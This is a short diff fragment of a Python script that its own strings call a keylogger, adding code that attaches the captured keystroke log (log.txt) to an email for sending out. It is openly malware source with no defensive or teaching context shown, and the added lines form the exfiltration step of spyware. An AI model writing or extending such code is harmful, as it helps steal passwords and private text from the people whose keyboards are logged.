@@ -48,4 +48,13 @@ def on_release(key):
 msg = MIMEText('This is the keylogger file.')
 msg['Subject'] = 'Keylogger file'
 
+#attach log.txt file to email
+etcFileName = 'log.txt'
+with open(etcFileName, 'rb') as etcFD : 
+    etcPart = MIMEApplication( etcFD.read() )
+
+    #add attached file's info to the header
+    etcPart.add_header('Content-Disposition','attachment', filename=etcFileName)
+    msg.attach(etcPart) 
+
 
